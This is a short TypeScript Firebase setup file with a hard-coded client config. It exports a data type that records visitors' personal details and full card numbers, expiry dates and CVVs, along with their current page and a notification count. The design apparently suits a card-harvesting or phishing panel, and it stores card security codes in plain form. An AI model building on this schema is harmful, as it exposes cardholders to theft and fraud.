import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDCefxkSYklbmzUk0GBoUIWinqtVj6uq1Q",
  authDomain: "rtfsd-ffb02.firebaseapp.com",
  projectId: "rtfsd-ffb02",
  storageBucket: "rtfsd-ffb02.firebasestorage.app",
  messagingSenderId: "685361304938",
  appId: "1:685361304938:web:77d2d31d054d1c4a104113",
  measurementId: "G-JM9DM7VMMT"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
